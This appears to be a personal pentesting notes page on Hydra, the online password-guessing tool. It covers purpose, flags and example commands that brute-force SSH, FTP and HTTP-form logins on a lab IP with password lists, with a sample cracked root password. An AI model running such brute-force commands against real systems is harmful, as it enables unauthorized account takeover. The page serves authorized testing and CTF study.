#### Official Documentation: [https://www.kali.org/tools/hydra/#tool-documentation](https://www.kali.org/tools/hydra/#tool-documentation)
#### Cheat Sheet: [[Kali Tools#Hydra|Hydra Commands]]
## Purpose
Hydra is a fast network logon cracker that performs online password guessing (brute-force/dictionary) against many services (SSH, FTP, HTTP forms, RDP).

## Scenarios
- CTF: Test default or guessable credentials on live services you control.  
- Real world: Authorized password-guessing tests (password spraying, credential stuffing) during a penetration test.

## All needed info to run
- Target service and protocol (e.g., `ssh`, `ftp`, `http-form-post`).  
- Username(s) and password list(s).  
- Common flags:
  - `-l <user>` or `-L <userlist>` → single username or list  
  - `-p <pass>` or `-P <passlist>` → password or password list  
  - `-t <tasks>` → concurrent threads  
  - `-s <port>` → port (if non-standard)  
  - `-f` → exit when a valid pair is found  
  - `-V` → verbose  
- Many modules require service-specific syntax for form-based auth (see hydra help).

## Example commands & outputs
```bash
# SSH login brute-force for single user using rockyou
$ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101 -t 4 -f
# Output snippet:
# [22][ssh] host: 192.168.56.101   login: root   password: toor123

# FTP with username list and password list
$ hydra -L users.txt -P passwords.txt ftp://192.168.56.101 -t 6 -f

# HTTP form example (syntax example)
$ hydra -l admin -P passwords.txt 192.168.56.101 http-form-post "/login.php:username=^USER^&password=^PASS^:F=incorrect"
```

!!! note "Hydra Basics"
	- Hydra performs online attacks — be careful with rate limits and lockouts on real systems.
	- For HTTP forms, exact form parameters and failure strings must be specified.
	- Use `-t` to control concurrency; too high may crash services or trigger protections.
	- Only run Hydra against systems you are authorized to test.

### [[Kali Tools#Hydra|Hydra Commands]]